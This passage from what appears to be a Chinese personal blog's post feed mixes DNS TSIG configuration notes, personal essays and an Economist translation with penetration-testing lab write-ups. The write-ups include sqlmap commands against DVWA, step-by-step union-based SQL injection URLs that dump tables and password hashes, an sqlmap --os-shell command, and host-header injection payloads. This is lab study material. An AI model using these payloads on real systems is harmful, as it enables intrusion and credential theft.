<li>设置密钥传输文件的权限<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 640 /var/named/chroot/etc/transfer.key</span><br><span class="line">chown root:named /var/named/chroot/etc/transfer.key</span><br></pre></td></tr></table></figure></li>
<li>将密钥传输文件链接到/etc目录 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln /var/named/chroot/etc/transfer.key /etc</span><br></pre></td></tr></table></figure></li>
<li>编辑主配置文件/etc/named.conf，增加以下两句<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image8992a90ca8278ac8.png" alt="image8992a90ca8278ac8.png"></li>
<li>清除iptables规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure></li>
<li>重启DNS服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart named</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>从服务器配置</li>
</ol>
<ul>
<li>删除已从主服务器同步的正向解析文件和反向解析文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -rf /var/named/slaves/*</span><br></pre></td></tr></table></figure></li>
<li>从主服务器拷贝transfer.key文件，放到/var/named/chroot/etc目录</li>
<li>设置密钥传输文件的权限<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 640 /var/named/chroot/etc/transfer.key</span><br><span class="line">chown root:named /var/named/chroot/etc/transfer.key</span><br></pre></td></tr></table></figure></li>
<li>将密钥传输文件链接到/etc目录 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln /var/named/chroot/etc/transfer.key /etc</span><br></pre></td></tr></table></figure></li>
<li>编辑主配置文件/etc/named.conf，增加以下部分<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image4f1df0f4771bdc68.png" alt="image4f1df0f4771bdc68.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/imagedb0144bcba5c4a67.png" alt="imagedb0144bcba5c4a67.png"></li>
<li>重启DNS服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart named</span><br></pre></td></tr></table></figure></li>
<li>检查是否成功从主服务器同步正向解析文件和反向解析文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /var/named/slaves</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image44d442f2657c8a1b.png" alt="image44d442f2657c8a1b.png"></li>
</ul>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>TISG加密</tag>
        <tag>DNS服务数据传输安全</tag>
      </tags>
  </entry>
  <entry>
    <title>今天父亲节</title>
    <url>//posts/ZH-CN/father&#39;s-day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天父亲节，昨天听说今天是世界末日，今天有些地区似乎可以看到日环食。今天可真特殊。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="又画了一个电子卡片，用了新电脑"><a href="#又画了一个电子卡片，用了新电脑" class="headerlink" title="又画了一个电子卡片，用了新电脑"></a>又画了一个电子卡片，用了新电脑</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/06/22/fd.gif" alt="fd.gif"></p>
<h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>要表达爱，只有表达出来，对方才能确认到，所以不要吝啬说爱。看到他人因自己而快乐，自己也得到快乐。</p>
<h2 id="永远猎奇永远鲜活"><a href="#永远猎奇永远鲜活" class="headerlink" title="永远猎奇永远鲜活"></a>永远猎奇永远鲜活</h2><p>设置了新的桌面背景和浏览器背景。打算买轻便本，华为还是macbook？手里的华为先体验一段时间再说。学习必须要继续，不能偷懒。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/22/imaged3f620429a9c4c15.png" alt="imaged3f620429a9c4c15.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/22/imagecd9ee8b85b6fd188.png" alt="imagecd9ee8b85b6fd188.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/22/image818c7082c453fadc.png" alt="image818c7082c453fadc.png"><br>正则表达式的这个图太好看了：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/22/image7edfb6ee23065f6b.png" alt="image7edfb6ee23065f6b.png"></p>
]]></content>
      <categories>
        <category>好奇星球</category>
      </categories>
      <tags>
        <tag>父亲节</tag>
      </tags>
  </entry>
  <entry>
    <title>使用phpstudy验证CSRF漏洞</title>
    <url>//posts/ZH-CN/phpstudy-verify-csrf.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>可以使用phpstudy建本地网站，将csrf漏洞验证的html放到网站根目录，验证csrf漏洞。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><ol>
<li>使用burp生成poc，将html保存到本地，命名为csrf.html。</li>
<li>将这个html上传到phpstudy网站根目录，输入127.0.0.1/csrf.html进行访问。</li>
<li>用burp抓包，重放csrf.html。如果能正常返回页面，说明csrf漏洞存在。<br>原理：本质上是修改了网站的referer。修复这个漏洞的方式是限制referer，不允许其他域名的referer访问网站。</li>
</ol>
<hr>
<p>待实操。</p>
]]></content>
      <categories>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>phpstudy</tag>
        <tag>验证csrf漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>wpscan申请API TOKEN的坎坷过程</title>
    <url>//posts/ZH-CN/Wpscan_Apply_API_TOKEN.html</url>
    <content><![CDATA[<h2 id="注册过程"><a href="#注册过程" class="headerlink" title="注册过程"></a>注册过程</h2><p><a href="https://wpvulndb.com/users/sign_in">注册地址</a><br>以github注册的，确认邮件发到了我的QQ邮箱……WTF??我已经记不清我的github是用google邮箱还是QQ邮箱注册的了。行吧，算是我记错了。但是为嘛QQ邮箱要把wpscan发过来的确认邮件放到垃圾箱？？？我一直怀疑应该是发到了谷歌邮箱，就是不见新的邮件发过来。后来脑袋转个弯，才想起这个可能被腾讯放到垃圾箱了。时间就是这么浪费的。<br>确认邮件验证完之后，登录不进去，密码又被我搞混了，又重置密码折腾了一下。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="申请API-TOKEN"><a href="#申请API-TOKEN" class="headerlink" title="申请API TOKEN"></a>申请API TOKEN</h2><p>最后成功登入系统，申请到API TOKEN。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0yot09lwj31f60srdiw.jpg" alt="image.png"></p>
<h2 id="怎么用"><a href="#怎么用" class="headerlink" title="怎么用"></a>怎么用</h2><p>举例：<br><code>wpscan --url http://10.10.10.10/wordpress -e --api-token xxxxxxxxxxxxxxxxxxx #-e简单进行整体快速扫描</code></p>
<p><a href="https://github.com/wpscanteam/wpscan">wpscan的github地址</a>          </p>
]]></content>
      <tags>
        <tag>wpscan注册</tag>
        <tag>申请API TOKEN</tag>
      </tags>
  </entry>
  <entry>
    <title>使用sqlmap测试dvwa的sql注入漏洞</title>
    <url>//posts/ZH-CN/sqlmap-dvwa-sql-injection.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>使用dvwa环境练习一下sql注入。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><p><a href="https://blog.csdn.net/huilan_same/article/details/68067550">参考教程</a><br>输入测试数据，获取到http请求的url：<code>http://47.57.91.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit</code><br><a href="https://v2ray.dana5haw.com:8008/image/xLcY"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagebec1f4185999143e.png" alt="imagebec1f4185999143e.png"></a><br>sqlmap时，需要带上cookie参数：<br><a href="https://v2ray.dana5haw.com:8008/image/xPKx"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image2a91462baac0dc33.png" alt="image2a91462baac0dc33.png"></a></p>
<ul>
<li>查看所有的数据库名称<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://47.57.91.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low;PHPSESSID=0nm9krnrptlt5v6ahockigke62&quot; --batch --dbs</span><br></pre></td></tr></table></figure>
<a href="https://v2ray.dana5haw.com:8008/image/xdP7"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagec2849ca6bdbf55af.png" alt="imagec2849ca6bdbf55af.png"></a></li>
<li>查看dvwa的所有表<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://47.57.91.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=0nm9krnrptlt5v6ahockigke62&quot; --batch -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>
<a href="https://v2ray.dana5haw.com:8008/image/xMbh"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image96a5d6d7105baf1f.png" alt="image96a5d6d7105baf1f.png"></a></li>
<li>查看user表的列数据<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://47.57.91.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low;PHPSESSID=0nm9krnrptlt5v6ahockigke62&quot; --batch -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>
<a href="https://v2ray.dana5haw.com:8008/image/xBAp"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image61666d2bedf171ed.png" alt="image61666d2bedf171ed.png"></a></li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
        <tag>dvwa</tag>
        <tag>sql注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>关于恒心的思考</title>
    <url>//posts/ZH-CN/Think_Stick.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天在跟着<a href="https://www.liaoxuefeng.com/">廖雪峰的博客</a>学习java编程入门，发现一个很耐人寻味的现象。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="从11025422到153"><a href="#从11025422到153" class="headerlink" title="从11025422到153"></a>从11025422到153</h2><p>这个java教程是比较火的一个系列。第一节的访问量达到了一亿次，然而最后一节的访问量仅有153次。虽然单从数据无法准确地说明问题，数据受到太多因素影响，但是我觉得至少从宏观上证明了这个道理：有恒心的人不多。而具备恒心，就可以淘汰掉那么多人。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc4dqmy3wuj31f60u0ais.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc4dpwq7rnj31f60u0gpo.jpg" alt="image.png"></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>我希望自己至少有恒心。</p>
]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>恒心</tag>
      </tags>
  </entry>
  <entry>
    <title>修改burp的编码格式解决中文显示乱码问题</title>
    <url>//posts/ZH-CN/burp-charset-chinese-display.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Burp抓包之后，收到的响应包数据显示中文乱码，怎么办？</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>为了解决Burp显示中文乱码问题，需要设置burp的【User options】——&gt;【Dispaly】——&gt;【HTTP Message Display】，设置字体为微软雅黑。<br><a href="https://v2ray.dana5haw.com:8008/image/1Lqn"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/21/image.png" alt="image.png"></a></p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><a href="https://v2ray.dana5haw.com:8008/image/1P9V"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/21/imagef64f6c8118238b38.png" alt="imagef64f6c8118238b38.png"></a></p>
]]></content>
      <categories>
        <category>burp</category>
      </categories>
      <tags>
        <tag>burp</tag>
        <tag>中文乱码</tag>
      </tags>
  </entry>
  <entry>
    <title>冬至日</title>
    <url>//posts/ZH-CN/dongzhiri.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好似当下的末日。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><ol>
<li>战乱时间的严惩，往往意味着死刑。</li>
<li>得了吧，他们祈福跳恒河，中毒跳恒河，你去看看新闻，恒河都快被尸体截流了！</li>
<li>记住，不要管任何人，明白吗?</li>
<li>让我们残忍起来根本不需要什么视频暗示，也不需要什么道理解释，仅仅一个命令，就足够了。我们，可是军人。</li>
<li>不要叫我大夫，那是负责救死扶伤的。今天的我，没资格被称为大夫。</li>
<li>你要在最清醒的状态里感受我们的残忍。你要在几百名医学者面前赤身裸体，毫无尊严，毫无人格。我们还会不断地询问你，疼吗？痒吗？什么感觉？我们会看着你逐步变异，逐步成为丧尸。</li>
<li>科学家利用运气，可从不等待运气。</li>
<li>人类都是死到临头时才意识到自己多么无知。</li>
<li>世界上真有灾难来临，坐以待毙的人。</li>
<li>自然是均衡的，要向死神手上拉回一个人，就意味着某个时间段，某个空间里，有人替他而亡。<h2 id="词条"><a href="#词条" class="headerlink" title="词条"></a>词条</h2></li>
<li>马基雅维利主义：在领域人格心理学，马基雅维利是一种心理特质集中在人际关系处理，不露声色的冷淡，冷漠和对道德的摒弃。</li>
<li>J.·马里恩·西姆斯：是一位外科学先驱，被认为是“美国妇科学之父”。现代历史学家认为他在研究中使用了奴隶作为实验对象。</li>
<li>拉文斯布吕克集中营：是纳粹德国时期的一个集中营，位于柏林以北90公里拉文斯布吕克村附近。拉文斯布吕克集中营于1939年5月启用。关押对象多为妇女。1945年4月30日，苏联军队解放此地。1939年至1945年，约有130,000名女囚在此关押，其中仅有约4万名幸存。</li>
<li>危地马拉梅毒试验：美国在1946年至1948年间为检验青霉素治疗梅毒的效果，在参加者不知情的情况下在危地马拉进行的一系列人体试验。试验中有696名感染者，其中约三分之一的感染者尚未得到有效治疗。美国政府在2010年10月就该事件发表正式的道歉。</li>
<li>塔斯基吉梅毒实验：美国公共卫生局性病部门在1932年至1972年间于阿拉巴马州与塔斯基吉大学合作，对近399名非洲裔男性梅毒患者及201名健康非洲裔男性所进行的一系列人体试验。这些实验参与者皆为生活贫困的阿拉巴马州梅肯县佃农。该实验以提供免费医疗、餐点、丧葬保险以吸引居民参与实验，也以此目的募集基金。</li>
<li>弗洛伦斯·南丁格尔，OM，RRC：英国护士和统计学家，出生于意大利一个来自英国上流社会的家庭。 南丁格尔在德国学习护理后，曾往伦敦的医院工作。于1853年成为伦敦慈善医院的护士长。 克里米亚战争时，她极力向英国军方争取在战地开设医院，为士兵提供医疗护理。 </li>
<li>希波克拉底誓词：俗称医师誓词，是西方医生传统上行医前的誓言，希波克拉底乃古希腊医者，被誉为西方“医学之父”。在希波克拉底所立的这份誓词中，列出了一些特定的伦理上的规范。但希波克拉底有可能不是这份誓词的原作者。</li>
</ol>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
        <tag>冬至日</tag>
      </tags>
  </entry>
  <entry>
    <title>制作的第一张母亲节电子贺卡</title>
    <url>//posts/ZH-CN/undefined.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天母亲节。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="谷歌电子卡片"><a href="#谷歌电子卡片" class="headerlink" title="谷歌电子卡片"></a>谷歌电子卡片</h2><p>就是谷歌浏览器的banner有这个制作电子卡片的推介，就玩了一把，顺便用ScreentoGif将录屏转为gif动图。<br>效果是酱紫：<br><a href="https://v2ray.dana5haw.com:8008/image/Z67G"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/md.gif" alt="md.gif"></a></p>
]]></content>
      <categories>
        <category>好奇星球</category>
      </categories>
      <tags>
        <tag>ScreentoGif制作gif动图</tag>
        <tag>母亲节</tag>
      </tags>
  </entry>
  <entry>
    <title>北溪二号完工，乌克兰怎么办</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-89day.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>经济学人浓咖啡马拉松计划doing！第-89天。</p>
<p><escape> <span id="more"></span></escape></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>Go with the flow: Ukraine and Nord Stream 2 顺其自然：乌克兰和“北溪二号”</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/martin-adams-a_PDPUPuNZ8-unsplash.jpg" alt="martin-adams-a_PDPUPuNZ8-unsplash.jpg"></p>
<p><font color=ab1942>Nord Stream 2</font>, a pipeline that will move natural gas from Russia to Germany, was finished in September.<br>9月，<font color=ab1942>“北溪二号”</font>管道完工，该管道将从俄罗斯运输天然气至德国。</p>
<p>Not everyone is celebrating.<br>当然并不是每个人都喜气洋洋。</p>
<p>Until now, a common route for Russian gas was along Ukrainian pipes to western Europe.<br>目前俄罗斯天然气的常规线路是经乌克兰管道中转，再运输至西欧。</p>
<p>NS2 means Ukraine stands to lose up to $2bn in annual <font color=ab1942>transit fees</font>.<br>启用“北溪二号”意味着乌克兰每年损失高达20亿美元的<font color=ab1942>运输费</font>。</p>
<p>Before the taps can be turned on, the pipeline must be certified as compliant with EU law.<br>在启用管道之前，“北溪二号”必须被认证为符合欧洲法律。</p>
<p>On Tuesday Germany’s electricity and gas regulator will give Naftogaz, the Ukrainian state energy firm, a <font color=ab1942>“&gt;preliminarily indication</font> of whether it plans to involve it in that process.<br>德国电气和天然气监管机构是否打算批准认证“北溪二号”？周二将为乌克兰能源公司Naftogaz<font color=ab1942>初步揭晓</font>。</p>
<p>（图源：郝晨晨）<br><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/hcc.png" alt="hcc.png"></p>
<p>PGE, the Polish state firm, has already been included.<br>此前，波兰公司PGE已被批准认证。</p>
<p>Ukraine is unlikely to vote to certify.<br>乌克兰不可能同意“北溪二号”的认证。</p>
<p>Yuriy Vitrenko, the chief executive of Naftogaz, says NS2 is not <font color=ab1942>compliant</font> because Gazprom, a <font color=ab1942>Kremlin-backed giant</font>, is involved and European law prohibits producers from owning pipelines that transport gas to customers.<br>Naftogaz的首席执行官Yuriy Vitrenko说，“北溪二号”不&lt;<font color=ab1942>合规</font>，因为<font color=ab1942>背靠克里姆林宫的</font>巨头Gazprom（俄国能源公司）也参与其中。而欧洲法律禁止厂商拥有向客户输送天然气的管道（欧洲法律规定能源生产与运输和贸易分离）。</p>
<p><font color=ab1942>Far from being independent</font>, the pipeline will increase Europe’s reliance on Russian gas, he claims, handing it yet more power.<br>他说，“北溪二号”将增加欧洲对俄罗斯天然气的依赖，<font color=ab1942>根本谈不上独立</font>，反而赋予俄罗斯更多权力。</p>
<p>（图源：德国之声中文网）<br><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/dw.png" alt="dw.png"></p>
<p><b>看起来“北溪二号”截断了中间商乌克兰的生意，乌克兰肯定不乐意咯~</b></p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>墨者靶场练习-SQL手工注入漏洞测试</title>
    <url>//posts/ZH-CN/mozhe-SQL-manual-inject.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>练习SQL手工注入，字符型注入。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><p>存在注入的页面：<br><a href="https://v2ray.dana5haw.com:8008/image/16Cn"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image2dbbb8e673dc6fa0.png" alt="image2dbbb8e673dc6fa0.png"></a><br>判断注入点：输入单引号和输入双引号的显示结果不同，说明存在字符型注入。<br><a href="https://v2ray.dana5haw.com:8008/image/10Vi"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image8e51211bec3654cc.png" alt="image8e51211bec3654cc.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/1JfV"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image666c3effefc9f335.png" alt="image666c3effefc9f335.png"></a></p>
<h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p>输入sql语句根据页面回显结果，可判断字段数为4：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:45209/new_list.php?id=tingjigonggao%27%20order%20by%204%23</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/1jQy"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image5af16f5400714cf7.png" alt="image5af16f5400714cf7.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/1A0A"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagedcdeba2aa5657f21.png" alt="imagedcdeba2aa5657f21.png"></a></p>
<h2 id="判断字段回显位置"><a href="#判断字段回显位置" class="headerlink" title="判断字段回显位置"></a>判断字段回显位置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:45209/new_list.php?id=-1%27%20union%20select%201,2,3,4%23</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/1CK9"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imageac72478a2ec50a07.png" alt="imageac72478a2ec50a07.png"></a></p>
<h2 id="获取数据库版本和当前数据库名称"><a href="#获取数据库版本和当前数据库名称" class="headerlink" title="获取数据库版本和当前数据库名称"></a>获取数据库版本和当前数据库名称</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:45209/new_list.php?id=-1%27%20union%20select%201,version(),database(),4%23</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/1GBO"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image1f60cbf136f46daf.png" alt="image1f60cbf136f46daf.png"></a></p>
<h2 id="获取当前数据库的所有表名称"><a href="#获取当前数据库的所有表名称" class="headerlink" title="获取当前数据库的所有表名称"></a>获取当前数据库的所有表名称</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:45209/new_list.php?id=-1%27%20union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),3,4%23</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/1nk6"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image5b6bb80dccd6df71.png" alt="image5b6bb80dccd6df71.png"></a></p>
<h2 id="获取表stormgroup-member的所有列"><a href="#获取表stormgroup-member的所有列" class="headerlink" title="获取表stormgroup_member的所有列"></a>获取表<code>stormgroup_member</code>的所有列</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:45209/new_list.php?id=-1%27%20union%20select%201,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27stormgroup_member%27),3,4%23</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/1vzL"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image5c51411dca2f2630.png" alt="image5c51411dca2f2630.png"></a></p>
<h2 id="获取user列、password列、status列的数据"><a href="#获取user列、password列、status列的数据" class="headerlink" title="获取user列、password列、status列的数据"></a>获取user列、password列、status列的数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:45209/new_list.php?id=-1%27%20union%20select%201,id,name,4%20from%20stormgroup_member%20%23</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/1Yie"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagec279e1beb7721527.png" alt="imagec279e1beb7721527.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:45209/new_list.php?id=-1%27%20union%20select%201,name,password,4%20from%20stormgroup_member%20where%20id=1%20%23</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/18g3"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image053c6631ef08d50a.png" alt="image053c6631ef08d50a.png"></a></p>
<h2 id="将md5密码解密"><a href="#将md5密码解密" class="headerlink" title="将md5密码解密"></a>将md5密码解密</h2><p><a href="https://www.cmd5.com/">在线解密网站</a><br><a href="https://v2ray.dana5haw.com:8008/image/1pfp"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image8856f648760d5e2f.png" alt="image8856f648760d5e2f.png"></a><br>用这个密码登录到系统，获取key。<br><a href="https://v2ray.dana5haw.com:8008/image/1XCB"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image6faad161d9b63806.png" alt="image6faad161d9b63806.png"></a></p>
<h2 id="扩展：以dba权限操作shell命令"><a href="#扩展：以dba权限操作shell命令" class="headerlink" title="扩展：以dba权限操作shell命令"></a>扩展：以dba权限操作shell命令</h2><p><a href="https://blog.csdn.net/T780000063/article/details/78900537">参考文章</a></p>
<ul>
<li>判断当前用户是否具有dba权限<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://219.153.49.228:45209/new_list.php?id=tingjigonggao&quot; --is-dba --batch</span><br></pre></td></tr></table></figure>
<a href="https://v2ray.dana5haw.com:8008/image/14Rh"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image4ff7e5132467ef13.png" alt="image4ff7e5132467ef13.png"></a></li>
<li>用sqlmap执行shell命令<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://219.153.49.228:45209/new_list.php?id=tingjigonggao&quot; --os-shell --batch</span><br></pre></td></tr></table></figure>
<a href="https://v2ray.dana5haw.com:8008/image/1K07"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagecc5df6e82fea5d85.png" alt="imagecc5df6e82fea5d85.png"></a><br>可执行shell命令：如<code>ifconfig</code><br><a href="https://v2ray.dana5haw.com:8008/image/1eeY"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image041f0d32f719d981.png" alt="image041f0d32f719d981.png"></a><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>主要参考了这篇<a href="https://blog.csdn.net/weixin_42277564/article/details/80583959">文章</a><br><a href="https://www.jianshu.com/p/268ef198d191">参考</a><br><a href="http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/#1-8-order-by%E5%90%8E%E7%9A%84%E6%B3%A8%E5%85%A5">参考</a><br><a href="https://blog.csdn.net/zzkkoo8/article/details/78812566">参考</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>墨者靶场练习</tag>
        <tag>SQL手工注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>墨者靶场练习-host头部注入</title>
    <url>//posts/ZH-CN/mozhe-host-inject.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>练习host头部注入。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><p>开启<a href="https://www.mozhe.cn/bug/detail/UWE3d3dJTWlmMDBYVUwvVFI0T2dmQT09bW96aGUmozhe">靶场</a><br>在host字段进行注入探测：<strong>存在sql注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">or 1=1</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/1sMx"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image.png" alt="image.png"></a></p>
<h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><strong>可判断有4个字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 4</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/12kS"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/imagefda9dea6ce45947c.png" alt="imagefda9dea6ce45947c.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 5</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/1O8G"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image2d1800fe6cf4a4cf.png" alt="image2d1800fe6cf4a4cf.png"></a></p>
<h2 id="判断字段回显位置"><a href="#判断字段回显位置" class="headerlink" title="判断字段回显位置"></a>判断字段回显位置</h2><p><strong>可判断回显位置是2,3,4</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4--</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/1biH"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/imaged6fa300ddae6d45b.png" alt="imaged6fa300ddae6d45b.png"></a></p>
